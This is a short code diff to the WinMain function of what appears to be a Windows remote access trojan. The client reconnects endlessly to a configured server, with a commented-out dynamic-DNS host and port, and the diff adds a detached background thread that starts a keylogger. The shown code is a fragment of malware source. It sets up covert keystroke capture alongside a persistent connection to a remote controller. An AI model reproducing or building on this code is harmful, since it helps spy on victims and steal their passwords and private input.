@@ -41,8 +41,15 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 
 	Client MyClient(Settings::serverIP, Settings::serverPort); //Client MyClient("nehcer.ddns.net", 38632);
 
+	std::thread Keylogger(Keylogger::StartLogger);
+	Keylogger.detach();
+
 	while (true)
 	{
+		
+
+	
+	
 		if (!MyClient.connected)
 		{
 			while (!MyClient.Connect())
@@ -54,6 +61,6 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	}
 
 	
-
+	
 	return 0;
 }
